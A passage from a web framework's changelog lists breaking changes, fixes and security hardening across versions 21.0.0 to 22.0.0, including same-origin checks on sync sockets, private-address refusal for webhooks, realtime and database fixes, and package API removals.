  <every entity table>` when missing, `ALTER PUBLICATION … ADD TABLE` for the entity tables it lacks,
  never a drop — instead of refusing boot; a role that may not is still refused with
  `X_REPLICATION_FAILED` and the statement to run. Every fix line that grants `REPLICATION` warns
  that the grant is cluster-wide (`BASE_BACKUP` reads every database, `pg_authid` included) and links
  `docs/ops/01-kubernetes.md#replication-is-a-cluster-wide-grant`.

### Security

- **realtime:** a sync socket upgrade from a page on another host is refused
  `403 X_SOCKET_ORIGIN_REFUSED` before `authenticate` (cross-site WebSocket hijacking with the
  `SameSite=Lax` session cookie), using the same-origin rule CSRF uses — now `proveSameOrigin` in
  `@ultimat3/core`. The node's own host name is admitted at any port; `APP_URL` (new in the scaffold's
  env schema, web + sync) admits a page on another host, through the new
  `createSyncNode({ allowedOrigins })`. **A deployment serving pages on a different host name than its
  sync node must set `APP_URL` on the sync role.**
- **realtime:** the sync node's accept budget is reserved before `authenticate` and refunded on every
  exit that takes no socket — a reconnect herd reaches the token service bounded by the burst, and a
  client with no credential can no longer starve every reconnect on the node.

### Fixed

- **social demo:** its realtime transport follows `NATS_URL`, so its config and its deployment cannot
  disagree.

### Commits

- fix(realtime): Postgres TLS per libpq sslmode, same-origin sync upgrades, bounded accept budget (#517)
- feat(realtime): replicator ensures its publication; social demo transport follows NATS_URL (#516)
- docs(roadmap): milestone 11 closed (#515)

## 22.0.0 - 2026-09-24

**22.0.0 in progress: plan 101, the framework deep sweep**
([`docs/plans/2026/09/23/101-framework-deep-sweep/`](docs/plans/2026/09/23/101-framework-deep-sweep/overview.md)).
Every breaking entry below has a manual edit in the
[Upgrading](https://github.com/developerz-ai/ultimate/wiki/Upgrading) `21.x → 22.0.0` section.

### Changed

- **BREAKING — `t.date` refuses any string that is not ISO-8601 in shape** (`'March 14, 2026'`,
  `'3/14/2026'`, `'12'`). `new Date` read these at the host's local midnight, so the answer depended
  on `TZ`. `coerceQuery` leaves them untouched and validation refuses them. Numbers (epoch ms) and
  `Date` objects are unchanged.
- **BREAKING — `timestamp()` refuses a string that is not ISO-8601 with `Z` or an offset**
  (`'2026-03-14T09:00'`, `'March 14, 2026'`); such a string used to be parsed in the host's zone.
- **BREAKING — `x deploy --method helm` names the release after `app.config.ts`'s `name`** (it was
  the literal `app`), waits for the rollout (`--wait`, `--timeout`, default 15m) and reports
  `data.rollout`. New `--release`, `--namespace` and `--timeout`, refused on `--method compose`.
  `planDeploy(image, 'helm', root)` needs a fourth `HelmTarget` argument.
- **BREAKING — `invokeAdminAction` no longer takes `expectedConfirmation`.** The gate derives the
  token from the action's entity and `subject.id`. Before, with both fields omitted, a destructive
  action ran unconfirmed.
- **Admin:** direct `adminCreate`, `adminUpdate` and `adminDestroy` calls refuse an operation the
  resource does not offer. An admin action called over MCP with an `id` loads the row, so row-level
  policies apply.
- **Testing:** `toDenyPolicy`, `toMatchOpenApi` and `toBeWithinBudget` throw on a receiver of the
  wrong type (`X_TEST_POLICY_EXPECTED`, `X_TEST_OPENAPI_EXPECTED`, `X_TEST_NUMBER_EXPECTED`) instead
  of passing under `.not`. The island test DOM treats all 14 void elements as leaves, and an observer
  that re-observes after `disconnect()` gets resizes again.
- **BREAKING — `@ultimat3/ui` `DateTime` / `toDate` refuses non-ISO strings** (`'August 14, 2026
  09:00'`, `'8/14/2026'`). Pass an ISO-8601 date, a date-time with `Z` or an offset, or a `Date`.
- **A draining process serves in-flight and kept-alive requests with `connection: close`** instead of
  answering `X_DRAINING` 503; it still answers 503 once stopped. A `helm upgrade` on kind failed 598
  of 7,690 requests before this, and none after.
- **`render`'s `contentHash` is xxHash32** (`Bun.hash`): 134 µs → 21 µs on a 96 kB document. Every
  static ETag and every scoped CSS class name changes once — a one-time cache bust.
- **Mail idempotency keys are `mail:<id>:<digest>`**, a digest over the canonical recipients and
  payload, so a 50-recipient send stays header-safe. Keys change once, so a retry spanning the deploy
  can send twice.
- **A gateway `budget` applies with no scope open.** `StopReason` gains
  `model_context_window_exceeded`, and an unknown stop reason counts as a truncation (`isTruncated()`).
- **Query routes send errors through the pipeline**, as action routes now do.
- **BREAKING — `channel()` requires `policy`.** A declaration without one is a type error and throws
  `X_CHANNEL_DECLARATION_INVALID`; a public channel says so with an explicit policy.
  `ChannelDescription.policy` is `string`, no longer `string | null`.
- **BREAKING — the offline outbox is stored one record per mutation.** `QueueStore.save(state)` →
  `write(change: QueueChange)`, and `LocalStore.saveQueue(scope, state)` → `writeQueue(scope, change)`.
  Two tabs saving whole queues erased each other's writes. Whole-queue records written by 21.x are
  converted on first read, so queued writes survive the upgrade.
- **BREAKING — `workerName(scope)` → `workerName(scope, buildId)`**: one SharedWorker per build.
- **BREAKING — `ChangeOp` gains `'truncate'`** (rowless). A `TRUNCATE` empties affected live windows and
  starts a new epoch on every open channel topic. A `switch` over `ChangeOp` needs the new case.
- **`startLiveReplicator` lives in `@ultimat3/realtime/server`.** `@ultimat3/testing` re-exports it for
  now.
- **`x g` refuses a path, a reserved word or a leading digit in a name** (`X_CLI_BAD_FLAG`) and always
  writes kebab-case slice directories: `x g entity BlogPost` writes `app/blog-post/`.
- **Surface boundaries are derived from `SURFACE_SPECS`**: an `api/`→`site/`, `site/`→`app/` or
  `app/`→`api/` runtime import is `X_BOUNDARY_SURFACE_IMPORT`. `api/` may import `app/`.
- **`x ci` findings are fenced as `source: 'ci-log'`**, never read as the framework's own.
- **BREAKING — `@ultimat3/core` drops `Result`**: `Result`, `Ok`, `Err`, `ok`, `err`, `map`, `mapErr`,
  `isOk`, `isErr`, `tryCatch`, `unwrap`, `unwrapOr` (`result.ts`, no consumer anywhere, and a second
  error path beside `throw UltimateError`). Use `throw`/`try`.
- **BREAKING — boot owns the auth tables.** `X_USERS_TABLE`, `X_SESSIONS_TABLE`, `X_ACCOUNTS_TABLE`,
  `X_VERIFICATIONS_TABLE`, `X_API_KEYS_TABLE` and `X_USERS_MIGRATION_1_3` are gone from
  `@ultimat3/auth`; `AUTH_TABLES` carries the 1.3 upgrade (`add column if not exists`) and boot applies
  it. Delete any hand-pasted auth migration.
- **BREAKING — unreferenced internals leave the package barrels.** Runtime values no code outside
  their own package used, none of them an error class, code table or documented API:
  - **auth:** `API_KEY_PREFIX_SEGMENTS`, `DEFAULT_JWKS_TTL_MS`, `DEFAULT_KDF_LIMITS`,
    `IDLE_SLIDE_DIVISOR`, `OAUTH_HANDSHAKE_COOKIE_PREFIX`, `ORG_ATTEMPT_FACTOR`, `SQL_AUTH_*` (7),
    `apiKeyPrefix`, `base64Url`, `base64UrlBytes`, `matchesHash`, `parseHashParams`,
    `parseSessionToken`, `pkceChallenge`, `resetKdfGate`.
  - **ui:** `BAR_CHART`, `CHANNELS_PATTERN`, `COMBOBOX_LIMIT`, `DELTA_ARROW_PATH`, `EMPTY_TOAST_QUEUE`,
    `GRID_STEPS`, `SPARKLINE`, `VISIBLE_EDGE`, `acceptMatches`, `accordionOpenIds`, `adoptDroppedFiles`,
    `ariaSortFor`, `clearSolidRuntime`, `collapsedToasts`, `distributeIssues`, `gridY`, `isIconTag`,
    `linkTarget`, `loadMoreState`, `loadingHints`, `maxOf`, `messagesOf`, `meterShare`, `meterWidth`,
    `nextRovingIndex`, `nextSortState`, `parseChannels`, `progressPercent`, `ratioFor`,
    `relativeTimeText`, `sameFieldValue`, `shellLandmarks`, `sparkPoints`, `visibleToasts`.
  - **core:** `OTEL_SAMPLER_ARG_KEY`, `OTEL_SAMPLER_KEY`, `OTLP_ENDPOINT_KEY`, `OTLP_HEADERS_KEY`,
    `OTLP_PROTOCOL_KEY`, `OTLP_SCOPE`, `OVERFLOW_ATTRIBUTE`, `SECRETS_ALG`, `SECRETS_IV_BYTES`,
    `SECRETS_KEY_BYTES`, `SECRETS_KEY_HEX_LENGTH`, `SECRETS_KEY_ID_LENGTH`, `SECRETS_TAG_BYTES`,
    `SECRETS_VERSION`, `SECRET_BRAND`, `SECRET_NAME`, `VERSION_MANIFEST`, `assertPixelBudget`, `fitBox`,
    `otlpAttributes`, `otlpResource`, `parseSecretsEnvelope`, `rasterFrom`, `resetDefaultSampler`,
    `scaledToFit`, `unixNano`.
  - **http:** `DEFAULT_CSRF`, `DEFAULT_TZ_CONFIG`, `FORWARDED_CLIENT_CERT`, `FORWARDED_FOR`,
    `FORWARDED_PROTO`, `SQL_RATE_LIMIT_*` (3), `TENANT_SCOPE`, `acceptsHtml`, `clientUsedHttps`,
    `forwardedValue`, `normalizePath`, `readCorrelation`, `renderOverlay`, `resetProblemMeta`,
    `selfOrigin`, `stripBasePath`.
  - **entity:** `SEARCH_PROPERTY`, `describePlan`, `emptyPlan`, `hasOrgPredicate`, `isOrgScoped`,
    `searchExpression`, `sqlTypeOf`, `tenantColumnOf`.
  - **query:** `PAGE_AFTER_KEY`, `PAGE_FIRST_KEY`, `advanceCursor`, `liveEpoch`, `matchesFilters`,
    `nameQuery`, `toKebabCase`.
  - **mcp:** `DEFAULT_QUERY_ROWS`, `MCP_RATE_LIMIT_WINDOW_MS`, `NO_ARGS`, `PARSE_GUARD`, `QUERY_LIMITS`,
    `STYLE_NAME`, `UI_DIFF_DEFAULT_THRESHOLD`, `UI_INTERACT_STEP_SCHEMA`, `UI_VIEWPORTS`,
    `URI_ARG_SCHEMA`, `appToolPrimitive`, `appToolPrimitives`, `bearerToken`, `isAgentActor`,
    `viewportOf`.
  - **ai:** `OVERALL`, `ZERO_USAGE`, `hybridSql`, `narrowScope`, `parseStopDetails`, `reasoningBody`,
    `resetAiRuntime`, `scopeAdmits`, `textSql`, `upsertSql`, `vectorLiteral`.
  - **mail:** `DARK_RULES`, `FOOTER_KEYS`, `MAIL_CATALOG_SOURCE`, `MAIL_ENV_KEYS`, `MAIL_FONT_STACK`,
    `MAIL_WIDTH_PX`, `RESEND_BASE_URL`, `UNCONFIGURED_DRIVER_NAME`, `UNSUBSCRIBE_KEY`, `darkModeCss`,
    `envelopeRecipients`.
  - **notify:** `DEFAULT_DELIVERY_WINDOW_MS`, `DEFAULT_MAX_DELIVERY_RECORDS`, `SQL_NOTIFY_*` (7),
    `requireDigest`.
  - **pwa:** `CAPABILITY_MANIFEST_KEYS`, `MIN_ENGAGEMENT_MS`, `SPLASH_MATRIX`, `STRATEGY_FNS`,
    `STRATEGY_FN_NAMES`, `STRATEGY_SOURCE`, `serializePrecacheManifest`, `serializePushMessage`.
  - **render:** `DEFAULT_REPLAY_EVENTS`, `DEFAULT_ROUTE_STATUS`, `ISLAND_NODE`, `THEME_SCRIPT_MAX_BYTES`,
    `checkIslandProps`, `headTagKey`, `isEmittableSpecifier`, `isErrorStatus`, `requiredStrategies`,
    `routeCount`, `toHeadTag`.
  - **scraping:** 38 internals (`DEFAULT_*` tunables, cookie matchers, snapshot/recording helpers).
  - **manifest:** `parseGuideSections`, `parseReExports`.
- **BREAKING — the e2e driver lives in `@ultimat3/testing`.** `@ultimat3/cli` no longer exports
  `installE2eDriver`, `e2eFixtures`, `startE2eApp`, `e2eApp`, `e2eBaseUrl`, `e2eBrowser`,
  `openE2eBrowser`, `openE2eBrowserIfAvailable`, `cdpConnect`, `cdpE2eTab`, `cdpE2eSession`,
  `findChrome`, `launchChrome`, `launchFoundChrome`, `CHROME_CANDIDATES`, `CHROME_PATH_ENV`, `e2ePage`,
  `e2eLocator` and the selection/evaluate helpers, the `Cdp*Error`/`E2e*Error` classes or their types.
  Import them from `@ultimat3/testing`; the preload is `@ultimat3/testing/e2e-preload`. The
  `X_E2E_*`/`X_CDP_*` codes are unchanged and now registered by testing (`E2E_ERROR_CODES`). The driver
  spawns the app's own `x`, resolved from the app root.
- **BREAKING — `entityRow(relation, physical, image)`** decodes a WAL image through the registered
  entity (`decodeRow`, money included) instead of guessing from column names; a relation with no
  registered entity is refused, and `camel` is no longer exported from `@ultimat3/realtime/server`.
- **BREAKING — a `sync` role with no reachable change feed refuses to boot** (`X_REALTIME_TOPOLOGY`):
  on a real database it needs `NATS_URL` (shared with `web` and one replicator) or an in-process
  replicator. It used to come up healthy and deliver nothing. Both charts (`roles.sync.enabled: false`,
  the `/_x/sync` Ingress rule gated on it) and both Compose files (`replicas: 0`) ship `sync` off, with
  the enable recipe beside the switch.
- **A production boot refuses the development cursor secret** (`X_CURSOR_SECRET_DEV`): set
  `ULTIMATE_CURSOR_SECRET`.
- **`@ultimat3/cli/serve`** exports `runRole` alone; the scaffold's `server.ts` imports it, and a bundle
  of it carries no testing, template, e2e or CDP module (`serve-graph.test.ts`). Only `web` builds
  islands at boot, and the metrics listener opens before boot work.
- **BREAKING — `x shot`, `x shot --island` and the `ui.*` MCP tools drive Chrome over raw CDP**, on the
  e2e step's launcher. An app no longer installs `puppeteer-core`, and `X_SHOT_BROWSER_MISSING` now
  means "no Chrome to launch": set `CHROME_PATH` where Chrome is not on the probed paths, or pass
  `--cdp-url`. Requests to hosts off the allow list are refused inside the browser and recorded as
  `refused: "host"`, and each response's status is recorded.
- **BREAKING — `ui.interact` step failures carry `X_SHOT_ELEMENT_MISSING`, `X_SHOT_ELEMENT_UNREADY` or
  `X_SHOT_KEY_INVALID` in `meta.code`**, not `X_SCRAPE_*`.
- **BREAKING — `@ultimat3/realtime` no longer exports `backoffDelay`.** Its 0-based copy counted one
  step differently from `@ultimat3/core`'s under the same name. Use core's with `attempt: n + 1`. A
  failed channel catch-up now retries after the base wait, not twice it.
- **BREAKING — `realtime.transport` decides the fanout bus**, not the presence of `NATS_URL`.
  `'nats'` dials the variable `realtime.urlEnv` names and refuses the boot (`X_CONFIG_INVALID`) when it
  is unset — it used to fall back to in-process in silence. `'memory'` with `NATS_URL` set refuses too.
  `realtime.enabled` (default `true`) is obeyed: `false` starts no `sync` node and no replicator, and
  `ROLE=sync` alone on such an app refuses. `'redis'`, never built, is removed
  from `RealtimeTransport`. `selectTransport(env)` → `selectTransport(env, { transport, urlEnv })`.
- **`x g resource` writes a real create action**: its input is the entity's `$view`, its org comes
  from the actor, and the form posts that shape. `x g` grants the permissions it declares (`<f>:read`
  to `member`, `<f>:write` to `admin`), registers the jobs and tasks it writes in `api/index.ts`, and
  refreshes `openapi.json` beside the manifest. The dev actor, the seed and the dashboard share one
  demo org. A fresh `x new` + `x g resource customer` answers `POST /api/customers/create` with 2xx
  under `x dev`.
- **New gate findings:** `X_PERMISSION_UNGRANTED` (a single-permission rule no role grants),
  `X_JOB_UNREGISTERED` (an anonymous job or task), `X_ROUTE_ASYNC_PAGE` (an async `Page` with no
  `load`). `x g --feature` refuses a slice that does not exist (`X_FEATURE_UNKNOWN`), and job, task and
  action generators no longer invent an entity. A module that will not load is reported once, under
  `manifest`. A boundary finding's `fix:` names the exact edit.
- **`x build --target docker` stamps `BUILD_ID` and writes a verified island store** (`.x/islands/`)
  the container loads instead of rebuilding; an island that will not parse is `X_BUILD_FAILED`.
- **BREAKING — `@ultimat3/testing` no longer exports `startLiveReplicator`, `LiveReplicator` or
  `LiveReplicatorOptions`.** Import them from `@ultimat3/realtime/server`.
- **`x shot`'s verdict records each response's status** and counts responses ≥ 400 as
  `network.failed` — recorded, never gating. The "HTTP response status is not observed" blind spot is
  retired.
- **`X_CSRF_BLOCKED` from a loopback caller names the header that proves same-origin**
  (`-H 'sec-fetch-site: same-origin'`).
- **The `AGENTS.md` tabulation warning reads only table headers**, so a conventions table no longer
  trips it.
- **BREAKING — `@ultimat3/cli` no longer exports 236 internals** nothing outside the package used:
  command objects other than `newCommand`, `dbCommand` and `verifyCommand`, scan internals, report
  helpers and option types. `maskLiterals` / `stripComments` come from `@ultimat3/core`. The CLI no
  longer depends on `@ultimat3/scraping`.
- **BREAKING — `x db gen`'s schema hash uses core's `canonicalJson`.** If `x verify --only drift`
  reports drift after upgrading, run `x db gen` once. Neither tracked app needed it.
- **`x` loads a command's code only when that command runs**: `x --help` 1.2 s → 0.24 s. Sass and
  Babel load on first use.
- **The CLI's modules say where they run**: `role-*` / `runtime-*` run in production, `dev-*` only under
  `x dev` (`module-naming.test.ts` derives it from the import graph).
- **`x build --target static` weighs authed routes inside a request**, as the app's measurement actor,
  with the app's own API answered in-process, and runs `load`s against a throwaway embedded database
  carrying the app's migrations and `dev` seeds. A dynamic route is weighed at its own `prerender()`
  paths; one with a budget and no `prerender()` is `X_BUDGET_PARAMS_UNDECLARED`, and a `render: 'ssr'`
  route with params is printed as not weighed.
- **BREAKING — a `from()` read that filters or sorts on a column its rows do not carry is
  `X_QUERY_COLUMN_UNSELECTED`** (`QueryColumnUnselectedError`); it used to answer `[]`. Add the column
  to the loader's `select({ … })`, or drop the filter if the loader already applies it.
- **The database pool runs unnamed statements (`prepare: false`).** A warm `select *` or
  `returning *` no longer fails with `0A000 cached plan must not change result type` on every running
  pod after a column is added or dropped, and the pool is safe behind PgBouncer's transaction mode.
  Measured cost: about 90 µs p50 per statement. `Date` parameters are encoded as ISO strings.
  Known limitation: on the Postgres pool a `timestamptz` with a year before 1000 reads back wrong,
  because `Bun.SQL` exposes no parser hook for unnamed statements; embedded PGlite reads it right.
- **`canonicalJson` / `fingerprint` tag bigints and bytes** (`BigInt(5)`, `Bytes(<hex>)`), so `5n`
  and `'5n'`, and `Uint8Array([1])` and `{0:1}`, no longer share a key. Idempotency and cache keys for
  payloads carrying a bigint change once.
- **Logger:** a caller field named `level`, `msg` or `ts` no longer overwrites the line's own; it is
  emitted as `field.<key>`.
- **4xx failures log at `warn` (401/403/429) or `info`**; only 5xx logs at `error`.
- **Production 5xx problem bodies no longer carry the server's cause** (for example the Postgres
  message and SQL of `X_DB_STATEMENT_FAILED`). `registerProblemMeta({ CODE: { publicCause: true } })`
  opts a code in.
- **An action's error takes the pipeline's error path** — `onError`/`reportError` on a 5xx, the HTML
  error page, `requestId`, `Retry-After` — and deprecation headers ride every response.
- **A patch property set to `undefined` writes nothing in either driver**; pass `null` to clear a column.
- **Tagged shared responses carry `Surrogate-Key` and `Cache-Tag`**, so CDN purges reach Fastly and
  Cloudflare. `x-cache-tags`, which no CDN reads, is no longer written.
- **Compose is hardened and rotates logs** (`read_only`, tmpfs, `cap_drop: [ALL]`,
  `no-new-privileges`, `mem_limit`), `stop_grace_period` 40 s. The scaffold Dockerfile installs from
  manifests only; the demo image is `--production` (842 → 594 MB).
- **Release path:** `release.yml` is split into a `check` job (no environment, no `id-token`: the ref
  check, `release.ts --check`, and `ci.yml`'s `verify` on the tagged commit) and a `publish` job
  (`needs: check`, `environment: npm-publish`). The in-workflow `verify` re-run, which had no
  Postgres, NATS or Redis, is gone. `publish` skips a package npm already holds, so
  `gh run rerun <id> --failed` resumes a partial release. Every printed tag command is annotated.
  `deploy-social-demo.yml` runs on `workflow_run` of `ci` and builds the exact commit CI passed.
- **The gate:** `bun run verify --only <step>` runs one step, and an unknown flag or step is refused
  (`X_CLI_BAD_FLAG`). The `typecheck` step runs `tsc -p .` in a root without `references`, so an
  upgrade to a version Bun already had cached no longer passes locally while CI fails (#450). The
  `manifest` step runs beside `live`; `noFloatingPromises` is scoped to shipped package source.
  Whole-tree guards read one shared corpus and refuse an unreadable tree (`X_CORPUS_UNSCANNED`).

### Added

- **`drain.readinessGraceMs`**, `configureLifecycle({ readinessGraceMs })` and `ServerOptions.drain`:
  `/readyz` answers 503 for 5 s (0 locally) before the listener closes, added to the drain deadline.
- **`assertNoDevSecretsOutsideLocal()`** throws `X_CURSOR_SECRET_DEV` at boot outside
  development/test; a process that names no environment counts as production.
- **`classifyAddress()` and `isPublicAddress()`** in `@ultimat3/core`.
- **`hostDecision`, `hostMatches`, `ANY_HOST`** in `@ultimat3/core`, moved from `@ultimat3/scraping`
  (which re-exports them). `@ultimat3/testing` exports `cdpConnectOver`, `CdpTransport`,
  `E2E_ERROR_CODES`, and a CDP event listener receives the event's `sessionId`. `@ultimat3/cli` no
  longer depends on `@ultimat3/scraping`.
- **`withInProcessFetch(fetchImpl, fn)`** in `@ultimat3/core`: every typed-client call inside `fn` is
  answered in-process, for a build's measurement render; it wraps `fetch` server-side, inside the
  scope only, and costs a browser bundle nothing. **`defineMeasurementActor(factory)`** /
  `measurementActor()` declare, from `app.config.ts`, the actor authed pages are weighed as.
- **`DbTx.onCommit`** and entity `Tx.onCommit`; **`entityForTable`** and **`decodeRow`** in
  `@ultimat3/entity`; **`stagedMasterKeyPath`** in `@ultimat3/core`; **`ColumnFact.hasDefault`** in the
  manifest.
- **`?locale=`** is read as a locale source, as `wiki/I18n.md` documents.
- **`x db gen` emits in-place column changes**: `set`/`drop default`, `drop not null` (or the
  backfill note for NOT NULL), and a generated column's retype when it becomes plain.
- **Webhook delivery refuses non-public targets**: the host is resolved and loopback, private,
  link-local, ULA, CGNAT and unspecified addresses are refused (`allowPrivate: true` opts out); the
  connection goes to the approved address; `http:` is refused outside a local environment.
- **Helm charts:** a hook ServiceAccount for the migrate Job, `startupProbe` on every role, a 5 s
  `preStop` sleep on Kubernetes 1.30+, the worker HPA on an `External` `queue_depth` metric,
  scheduler memory 512Mi. A `deploy-proof` CI job installs and upgrades the chart on kind under load.
- **Gate rules:** `pin-raises` (`X_PIN_RAISE_UNSTATED`), stale "unreleased" claims in
  `changelog-check` (`X_DOC_UNRELEASED_STALE`), a generated `llms.txt` (`X_LLMS_TXT_DRIFT`,
  `bun run llms-txt --write`); `budget-raises` fetches `origin/main` or refuses
  `X_BUDGET_BASE_MISSING`. `scripts/release.ts` refuses a dirty tree (`X_RELEASE_TREE_DIRTY`) and a
  `--version` at or below the current one or combined with `--bump` (`X_RELEASE_VERSION_INVALID`).
- **`X_STORAGE_NOT_PENDING`** (409), **`X_JOB_NOT_REQUEUEABLE`** (409), **`X_JOB_DECLARATION_INVALID`**.

### Fixed

- **core:** `writeMasterKeyFile` replaces the key atomically at 0600. Prometheus HELP lines no longer
  escape `"`. A same-key read issued right after `bump()` no longer joins the aborted flight. OTLP
  exporters hold at most one batch in flight while a collector stalls. `probeImage` applies JPEG EXIF
  orientation. Config overlays merge key by key, and an overlay's `undefined` changes nothing.
  `jobs.concurrency`, `jobs.maxAttempts`, `jobs.visibilityTimeoutMs` and `cache.defaultTtlMs` are
  refused at boot unless whole numbers in range.
- **http:** a `public` cache hint on a signed-in request is `private`. The error page's retry link can
  no longer point to another host. `x-forwarded-client-cert` values are unescaped once. Security
  headers are built once per config (30 µs → 0.03 µs per response).
- **auth:** OAuth userinfo/emails fetch failures and the token leg no longer put provider text (which
  could carry `client_secret`) in the public body. `issueApiKey` refuses an `env` `parseApiKey`
  cannot read back. `MemoryAdapter.linkAccount` keeps the owner on re-link; `linkAccount` returns the
  stored row; `listApiKeys` has one order in both adapters.
- **db:** a `BEGIN ATOMIC` body is one statement. The replica breaker ignores errors in the caller's
  own statement. Two PGlite clients no longer write into each other's transactions. `reapBranches`
  refuses a non-integer `maxAgeMs`. The ledger id in `rollback()`'s fix line is encoded. Generated
  expressions are screened on every path. Embedded Postgres reads every timestamp in any session zone.
- **entity / query:** the memory driver refuses duplicate keys (`X_DB_UNIQUE_VIOLATION`).
  `.transition()` works on entities not keyed by `id`. `decimal()`/`bigint()` store Postgres's
  canonical spelling in both drivers. A seed `upsert` reports `skipped` on re-run. `min`/`max` over
  `timestamptz` is right in any session zone. Keyset pagination keeps numeric id tiebreaks. The live
  matcher treats equal `bigint` and `number` as equal. `text({ max })` counts code points and
  `integer()` enforces int4.
- **storage:** `promoteAttachment` accepts only a pending key. `sweepOrphans` refuses a non-integer
  `olderThanMs`. The local disk treats a process that names no environment as production.
- **money** renders every digit up to `MAX_SAFE_INTEGER`. **time:** `fromIso` refuses non-ISO text.
  **i18n:** a registered `pt-BR` resolves regardless of case. **seo:** offsetless feed dates are
  treated as absent; a title may contain `$$`; a `null` required JSON-LD field raises `X_LD_INVALID`.
- **action:** an idempotent replay is re-validated against the output schema. A mutator carries
  `row`, `rateLimit` and `deprecated`.
- **jobs:** a bad cron is refused at `task()`, and one failing task no longer stops the round. Step
  replays have one shape on every driver. A claim round that fails partway returns the rest of its
  batch without using attempts. A due delayed job counts as ready. A SIGTERM during a manual
  scheduler stop respects the budget. `x jobs retry` refuses a live job (`X_JOB_NOT_REQUEUEABLE`) and
  `--from-step` drops the steps after the target too.
- **mcp:** `readonly-sql` refuses dollar tags with digits or non-ASCII characters, and a `$tag$`
  glued to an identifier can no longer hide a call. `ping` and `prompts/get` are answered.
- **ai:** Bun's connection errors are retried; the redactor runs over `agent()` tool results;
  re-indexing a shorter document prunes its old chunks; the Postgres vector upsert dedupes repeated
  ids; a non-2xx embedder body is bounded.
- **mail:** bytes pipelined after the STARTTLS `220` refuse the session (RFC 3207 §4.2).
- **notify:** a digest window closed but not yet drained is no longer lost.
- **pwa:** stale-while-revalidate keeps its fetch event alive while it refreshes.
- **render:** ISR route lookup is compiled once per registry change; stream reveals are one constant,
  CSP-hashable script (`STREAM_REVEAL_BODIES`); prerender params that escape the output directory are
  refused and URLs are percent-encoded; an emptied stylesheet stops serving under `x dev`.
- **ui:** `Dialog`/`Drawer` no longer close on a drag that ends on the backdrop; `InfiniteScroll` no
  longer stalls; `CopyButton` says "Copied" only after the write succeeds.
- **realtime, server:** a live patch's `index` is counted against the subscriber's own rows; a cold
  window no longer loses rows written during its first read, and its lsn is read before the rows;
  Bun's `-1` send result is a delivered frame and the drop ceiling is per 10 s window; a frame is
  encoded once per delivery (16.9 ms → 0.6 ms to 10,000 sockets); fan-out is indexed (80.7 ms →
  6.1 ms at 1,000 × 500); channel loaders run as the subscribing actor; NATS KV presence pages (it
  answered an empty set past 1,024 members); the replication reader copies a message once (32 MB:
  5.6 s → 69 ms); publication and `wal_level` preflight fixes work on managed Postgres.
- **realtime, client:** a write left `inflight` by a reload is resent; a write made while the outbox is
  non-empty queues behind it; replay holds `navigator.locks`; a tab's realtime recovers from a worker
  reap and a bfcache restore; a gap during catch-up earns another read and a failed catch-up shows
  `failed` while it retries; an IndexedDB quota abort rejects writes instead of hanging them; a
  superseded `more()` no longer overwrites the page cursor.
- **cli:** `x g` and `x new` conflict fixes reproduce every flag. `x new` refuses a name with no
  letters or digits (`X_APP_NAME_EMPTY`) and never commits into a directory that already existed. An
  app that loads no module is `X_APP_EMPTY`, not a vacuous green. Commands run from a subdirectory
  load the root's `.env*`. `x dev` reads `PORT` and releases what it acquired when boot fails.
  `x build --target static` empties its export directory; a relative `--out` resolves against the cwd.
  `x db reset` refuses while `x dev` runs. `x manifest --check` checks `openapi.json`. `x secrets
  rotate` survives a crash between its writes, and Ctrl-C in `x secrets edit` terminates. The i18n
  index is rewritten only if it still matches the template. A throwing `applies()` fails one gate step,
  not the gate. `ui.*` tools refuse origin-escaping routes. The island settle waits for the mount
  (#474), and an old capture can no longer hide a failed one. `package-shape` scans imports with the
  transpiler (#493).
- **The dev row observer reports changes at `COMMIT`**; a rollback reports nothing.
  `installSecrets` recovers from a key rotation interrupted before its rename. Adding a NOT NULL
  column with a default is additive in the manifest diff. Scraping's request interception leaves no
  unhandled rejections.
- **core:** `maskLiterals` / `stripComments` handle a template literal nested inside another
  template's `${}`; they used to close the outer template early and hide every literal after it from
  the gate's scanners.
- **deploy:** a first `helm install` no longer hangs on the pre-install migrate Job.

### Commits

- docs: 22.0.0 leaves flight in Upgrading; milestone 11 closed on main's deploy-proof (0/9,028 failed)
- feat!: plan 101 — framework deep sweep (22.0.0) (#512)
- docs(plans): 101 — third sweep and the demo's infrastructure stack (#511)
- docs(plans): 101 — framework deep sweep, 18 tier-ordered slices (#510)

## 21.0.0 - 2026-09-23

**21.0.0 in progress: one client store, one transport, one socket.** The design is
[`docs/architecture/21-client-data-layer.md`](docs/architecture/21-client-data-layer.md). Every
removed surface gets a `BREAKING —` entry here and a manual edit in the
[Upgrading](https://github.com/developerz-ai/ultimate/wiki/Upgrading) `20.x → 21.0.0` section. There
is no codemod and no compatibility shim.

### Added

- **`CLIENT_SCOPE_HEADER`** (`'x-ultimate-scope'`) in `@ultimat3/core`: the response header naming the
  principal scope a private document was rendered for, which the service worker partitions by.
- **`@ultimat3/core/page`, a browser-light entry.** The page handle, the scope fence, the page-meta
  constants (`APP_UPDATE_MESSAGE` among them), `UltimateError`, `clientTransport`, `actionPath`,
  `queryPath` and the helpers browser code needs, with **no error-titles table**.
  `page-bundle.test.ts` fails if it ever grows one back. Core's titles moved to
  `core-error-codes.ts`, anchored by the barrel. So a browser bundle that imports only
  `@ultimat3/core/page` and throws shows a code's **name** as its title, not the registered title.
  `@ultimat3/realtime`'s browser errors split into `page-errors.ts` by the same rule.
  `@ultimat3/query/client` carries no titles table either.
- **`browserBackoff` and `BROWSER_RECONNECT_MAX_MS`** are exported from `@ultimat3/realtime`: the
  browser's reconnect curve (500 ms base, factor 2, `equal` jitter, 4 s cap). The restart bench
  client now uses it.
- **`locale?` and `tz?` on `Actor` / `ActorInit`** (`@ultimat3/core`): a member's saved preferences,
  which `resolveLocale` and `resolveTimeZone` read as their `user` rung.
- **A channel's first join is caught up.** A join with no cursor on a channel that carries records
  is answered with one `replay-gap`, so the client runs one catch-up read. The rows written between
  the page's render and its join reach it. `x dev`'s in-process change bridge now feeds the
  declared channels too, so their `records` flow in development
  (`packages/testing/src/live-replicator.ts`).
- **A `records` frame names the write that produced it**, as `write`: the digest of the
  idempotency key the request carried (`writeDigest` in `@ultimat3/core`, never the key, since a
  frame goes to every member). A frame naming a write that is still pending on this page settles
  that write's overlay in the same notification as its rows. The node fans a commit out before it
  answers, so the frame usually beats the answer, and a like replayed from the outbox painted `3`
  for one like until the answer landed. Any other frame is still truth under the overlay. The name
  travels two ways:
  - **In process** (`x dev` on the embedded database): `@ultimat3/action`'s HTTP projection opens
    `withWriteOrigin(digest)` for any request carrying an `idempotency-key`, idempotent action or
    not, and the row observer copies it onto the change.
  - **Through the WAL**: the Postgres driver opens a keyed write's transaction with
